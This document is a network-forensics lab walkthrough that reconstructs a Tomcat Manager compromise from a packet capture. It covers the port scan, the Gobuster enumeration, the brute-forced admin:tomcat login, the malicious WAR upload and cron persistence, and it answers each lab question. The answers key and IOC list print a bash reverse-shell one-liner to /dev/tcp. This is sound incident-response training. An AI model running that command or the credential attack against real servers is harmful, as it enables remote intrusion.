# Tomcat Takeover Lab
## Category
Network Forensics

## Scenario
 The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.


## Tools Used
- Wireshark
- ipgeolocation.io

## Walkthrough

### Q1 — Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?
**What I did:** First, I accessed Statistics &gt; Conversations in Wireshark to understand the general content of the traffic.
**What I found:** I found multiple conversations with IP addresses from the same network, with the exception of one that stood out from the rest.
**Answer:** `14.0.0.120`


![q1](screenshots/1.jpeg)

### Q2 — Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
**What I did:** I used the website ipgeolocation.io to get geolocation information from the identified IP.
**What I found:** By entering the IP, I received a list of information about it, including its country of origin.
**Answer:** China


![q2](screenshots/2.jpeg)

### Q3 — From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?
**What I did:** If a port gives access to the web server, there will necessarily be HTTP traffic. I used this to filter the traffic with the `http` filter.
**What I found:** After filtering, I used Statistics &gt; Conversations to see the conversations from the filtered traffic, which allowed me to identify the port used.
**Answer:** `8080`


![q3](screenshots/3.jpeg)

### Q4 — Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
**What I did:** Since the attacker used enumeration to discover the site's directories, the type of packets to look for is HTTP with the GET method. I filtered the traffic with `http.request.method == "GET"`.
**What I found:** I found the tool used in the User-Agent section of the HTTP requests.
**Answer:** Gobuster



![q4](screenshots/4.jpeg)

### Q5 — After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?
**What I did:** I filtered the traffic to only show HTTP packets with a response different from code 404, using a filter like `http.response.code != 404`.
**What I found:** With this filtered traffic, I was able to access Follow TCP Stream, that's where the details were.
**Answer:** `/manager`




![q5](screenshots/5-1.jpeg)
![q5](screenshots/5-2.jpeg)

### Q6 — After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?
**What I did:** I filtered the traffic to only show HTTP packets containing authentication information, looking for the `Authorization` headers.
**What I found:** I accessed the details of the last login packet to see the authentication information successfully used.
**Answer:** `admin:tomcat`



![q6](screenshots/6.jpeg)

### Q7 — Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?
**What I did:** Since the attacker uploaded a malicious file, I filtered the traffic to only show HTTP packets containing the POST method with `http.request.method == "POST"`.
**What I found:** I found a segmented packet, so I used Follow &gt; HTTP Stream to reassemble the segments and see the full content.
**Answer:** `JXQOZY.war`



![q7](screenshots/7.jpeg)
![q7](screenshots/7-2.jpeg)

### Q8 — After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
**What I did:** I used Follow TCP Stream on the traffic containing the authentication packets, then I incremented the stream number. Since the attempt to establish a reverse shell logically occurs after the successful login attempt.
**What I found:** I found a command stream where the attacker executes system commands to identify their location, their identity, and tries to establish the reverse shell.
**Answer:** `/bin/bash -c 'bash -i &gt;& /dev/tcp/14.0.0.120/443 0&gt;&1'`



![q8](screenshots/8.jpeg)

## Incident Timeline
- t=346.031483 : The attacker starts the reconnaissance phase by sending SYN packets to find open ports.
- t=346.032874 : The attacker receives an ACK response from port 8080 which gives access to the web server.
- t=386.466599 : The attacker starts using Gobuster to enumerate the directories of this server.
- t=409.531388 : Access to the `/manager` directory by the attacker after enumeration.
- t=556.169867 : The attacker attempts to create a reverse shell by uploading a malicious file.
- t=669.793931 : Establishment of the reverse shell aiming to maintain persistence on the compromised machine.

## Indicators of Compromise (IOCs)
- IP ADDRESS: 14.0.0.120
- PORT: 8080
- TOOL : Gobuster/3.1.0
- CREDENTIALS : admin:tomcat
- URL : /manager
- FILENAME : JXQOZY.war
- COMMAND : /bin/bash -c 'bash -i &gt;& /dev/tcp/14.0.0.120/443 0&gt;&1'
- COUNTRY : China

## MITRE ATT&CK Mapping

| Phase | Technique ID | Technique Name | Description |
|-------|-------------|----------------|-------------|
| Reconnaissance | T1046 | Network Service Discovery | The attacker performs a port scan by sending SYN packets to identify open services on the target server. |
| Discovery | T1083 | File and Directory Discovery | Use of Gobuster to enumerate directories and files present on the web server. |
| Initial Access | T1110 | Brute Force | Repeated login attempts on the `/manager` panel with different credential combinations until `admin:tomcat` was obtained. |
| Initial Access | T1190 | Exploit Public-Facing Application | Exploitation of the exposed Tomcat Manager administration interface on port 8080. |
| Persistence | T1505.003 | Web Shell | Upload of the malicious file `JXQOZY.war` allowing the deployment of a web shell on the server. |
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Establishment of a reverse shell via `/bin/bash -c 'bash -i &gt;& /dev/tcp/14.0.0.120/443 0&gt;&1'`. |
| Persistence | T1053.003 | Scheduled Task/Job: Cron | The reverse shell command is scheduled via crontab to ensure persistence on the compromised machine. |
